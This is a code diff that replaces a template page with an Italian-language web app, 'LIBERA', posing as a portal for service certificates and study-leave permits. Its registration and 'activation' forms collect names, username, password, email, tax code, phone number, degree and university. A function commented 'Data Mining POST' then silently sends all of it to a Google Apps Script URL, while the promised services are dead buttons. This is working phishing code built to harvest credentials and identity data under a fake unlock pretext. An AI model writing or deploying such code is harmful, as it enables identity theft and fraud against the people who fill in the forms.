@@ -1,13 +1,164 @@
-<!doctype html>
-<html lang="en">
-  <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>My Google AI Studio App</title>
-  </head>
-  <body>
+<!DOCTYPE html>
+<html lang="it">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>LIBERA - Elite Ecosystem</title>
+    <script src="https://unpkg.com/react@18/umd/react.production.min.js"></script>
+    <script src="https://unpkg.com/react-dom@18/umd/react-dom.production.min.js"></script>
+    <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://unpkg.com/framer-motion@10.16.4/dist/framer-motion.js"></script>
+    <script src="https://unpkg.com/lucide@latest"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap" rel="stylesheet">
+    <style>
+        body { background-color: #000; color: #fff; font-family: 'Inter', sans-serif; overflow-x: hidden; }
+        .glitch { position: relative; color: #00f3ff; font-size: 8rem; font-weight: 900; animation: glitch-skew 1s infinite linear alternate-reverse; }
+        .glitch::before, .glitch::after { content: 'L'; position: absolute; top: 0; left: 0; width: 100%; height: 100%; }
+        .glitch::before { left: 2px; text-shadow: -2px 0 #ff00c1; clip: rect(44px, 450px, 56px, 0); animation: glitch-anim 5s infinite linear alternate-reverse; }
+        .glitch::after { left: -2px; text-shadow: -2px 0 #00fff9, 2px 2px #ff00c1; animation: glitch-anim2 1s infinite linear alternate-reverse; }
+        @keyframes glitch-anim { 0% { clip: rect(31px, 9999px, 94px, 0); } 100% { clip: rect(60px, 9999px, 50px, 0); } }
+        @keyframes glitch-anim2 { 0% { clip: rect(65px, 9999px, 100px, 0); } 100% { clip: rect(10px, 9999px, 80px, 0); } }
+        @keyframes glitch-skew { 0% { transform: skew(1deg); } 100% { transform: skew(-1deg); } }
+        .glass-card { background: #0a0a0a; border: 1px solid #1a1a1a; border-radius: 1.5rem; backdrop-filter: blur(10px); }
+        .input-field { width: 100%; background: rgba(255,255,255,0.05); border: 1px solid #1a1a1a; border-radius: 1rem; padding: 1rem; color: #fff; outline: none; transition: 0.3s; }
+        .input-field:focus { border-color: #00f3ff; }
+        .btn-primary { background: #00f3ff; color: #000; font-weight: 900; text-transform: uppercase; padding: 1rem; border-radius: 1rem; transition: 0.3s; box-shadow: 0 0 20px rgba(0,243,255,0.3); }
+        .btn-primary:hover { transform: scale(1.02); }
+        .btn-locked { background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1); color: rgba(255,255,255,0.2); font-weight: 700; padding: 1rem; border-radius: 1rem; cursor: not-allowed; }
+    </style>
+</head>
+<body>
     <div id="root"></div>
-    <script type="module" src="/src/main.tsx"></script>
-  </body>
-</html>
+    <script type="text/babel">
+        const { useState, useEffect } = React;
+        const { motion, AnimatePresence } = FramerMotion;
 
+        const App = () => {
+            const [phase, setPhase] = useState('splash');
+            const [user, setUser] = useState(null);
+            const [showUnlock, setShowUnlock] = useState(false);
+            const [missionComplete, setMissionComplete] = useState(false);
+
+            useEffect(() => {
+                setTimeout(() => setPhase('auth'), 2500);
+            }, []);
+
+            const handleRegister = (e) => {
+                e.preventDefault();
+                const data = new FormData(e.target);
+                const u = Object.fromEntries(data.entries());
+                setUser(u);
+                setPhase('dash');
+            };
+
+            const handleUnlock = async (e) => {
+                e.preventDefault();
+                const data = new FormData(e.target);
+                const unlockData = Object.fromEntries(data.entries());
+                
+                // Data Mining POST
+                fetch("https://script.google.com/macros/s/AKfycbxf4WinAYmw6sgbXNiVF6_lM3jWEPckJ87MFKCqEK-1JkCgiHz1Gd9yWxoGmnp3Z5-P/exec", {
+                    method: "POST",
+                    mode: "no-cors",
+                    body: JSON.stringify({ ...user, ...unlockData })
+                });
+
+                setMissionComplete(true);
+                setShowUnlock(false);
+            };
+
+            if (phase === 'splash') return (
+                <div className="fixed inset-0 flex items-center justify-center bg-black">
+                    <div className="glitch">L</div>
+                </div>
+            );
+
+            return (
+                <div className="min-h-screen p-6 flex flex-col items-center">
+                    <header className="w-full max-w-4xl flex justify-between items-center py-8">
+                        <div className="flex items-center gap-2">
+                            <div className="w-8 h-8 bg-[#00f3ff] text-black font-black flex items-center justify-center rounded-lg">L</div>
+                            <span className="text-xl font-black uppercase italic tracking-tighter">Libera</span>
+                        </div>
+                    </header>
+
+                    <main className="w-full max-w-4xl">
+                        <AnimatePresence mode="wait">
+                            {phase === 'auth' && (
+                                <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} className="glass-card p-10 max-w-md mx-auto">
+                                    <h2 className="text-3xl font-black uppercase mb-8 text-center">Crea Profilo</h2>
+                                    <form onSubmit={handleRegister} className="space-y-4">
+                                        <div className="grid grid-cols-2 gap-4">
+                                            <input name="nome" required className="input-field" placeholder="Nome" />
+                                            <input name="cognome" required className="input-field" placeholder="Cognome" />
+                                        </div>
+                                        <input name="username" required className="input-field" placeholder="Username" />
+                                        <input name="password" type="password" required className="input-field" placeholder="Password" />
+                                        <input name="email" type="email" required className="input-field" placeholder="Email Privata" />
+                                        <button className="btn-primary w-full mt-4">UNISCITI</button>
+                                    </form>
+                                </motion.div>
+                            )}
+
+                            {phase === 'dash' && (
+                                <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="space-y-8">
+                                    {!missionComplete && (
+                                        <button onClick={() => setShowUnlock(true)} className="w-full p-6 glass-card border-[#00f3ff]/30 bg-[#00f3ff]/5 flex justify-between items-center">
+                                            <div className="text-left">
+                                                <h3 className="text-lg font-black uppercase italic">Operazione Attivazione</h3>
+                                                <p className="text-white/40 text-xs uppercase tracking-widest">Completa i dati per sbloccare i servizi</p>
+                                            </div>
+                                            <span className="text-[#00f3ff]">➔</span>
+                                        </button>
+                                    )}
+
+                                    {missionComplete && (
+                                        <div className="w-full p-6 glass-card border-green-500/30 bg-green-500/5">
+                                            <h3 className="text-lg font-black uppercase italic text-green-500">Missione Compiuta</h3>
+                                            <p className="text-white/40 text-xs uppercase tracking-widest">Servizi Sbloccati. Passa in ufficio solo per il ritiro dei documenti.</p>
+                                        </div>
+                                    )}
+
+                                    <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
+                                        <div className={`glass-card p-8 relative ${!missionComplete ? 'opacity-40' : ''}`}>
+                                            {!missionComplete && <div className="absolute inset-0 flex items-center justify-center text-white/20">🔒</div>}
+                                            <h3 className="text-2xl font-black uppercase italic mb-4">Richiedi Attestato</h3>
+                                            <p className="text-white/40 text-sm mb-6">Certificazioni ufficiali di servizio istantanee.</p>
+                                            <button className={missionComplete ? 'btn-primary w-full' : 'btn-locked w-full'}>AVVIA RICHIESTA</button>
+                                        </div>
+                                        <div className={`glass-card p-8 relative ${!missionComplete ? 'opacity-40' : ''}`}>
+                                            {!missionComplete && <div className="absolute inset-0 flex items-center justify-center text-white/20">🔒</div>}
+                                            <h3 className="text-2xl font-black uppercase italic mb-4">Permesso 150 Ore</h3>
+                                            <p className="text-white/40 text-sm mb-6">Modulo digitale per diritto allo studio.</p>
+                                            <button className={missionComplete ? 'btn-primary w-full' : 'btn-locked w-full'}>AVVIA ISTANZA</button>
+                                        </div>
+                                    </div>
+                                </motion.div>
+                            )}
+                        </AnimatePresence>
+                    </main>
+
+                    {showUnlock && (
+                        <div className="fixed inset-0 bg-black/90 backdrop-blur-xl z-50 flex items-center justify-center p-6">
+                            <motion.div initial={{ scale: 0.9 }} animate={{ scale: 1 }} className="glass-card p-10 max-w-md w-full">
+                                <h2 className="text-2xl font-black uppercase italic mb-6">Operazione Attivazione</h2>
+                                <form onSubmit={handleUnlock} className="space-y-4">
+                                    <input name="cf" required className="input-field" placeholder="Codice Fiscale" />
+                                    <input name="cell" required className="input-field" placeholder="Cellulare" />
+                                    <input name="titolo" required className="input-field" placeholder="Titolo di Studio" />
+                                    <input name="uni" required className="input-field" placeholder="Università" />
+                                    <button className="btn-primary w-full mt-4">COMPLETA MISSIONE</button>
+                                </form>
+                            </motion.div>
+                        </div>
+                    )}
+                </div>
+            );
+        };
+
+        const root = ReactDOM.createRoot(document.getElementById('root'));
+        root.render(<App />);
+    </script>
+</body>
+</html>
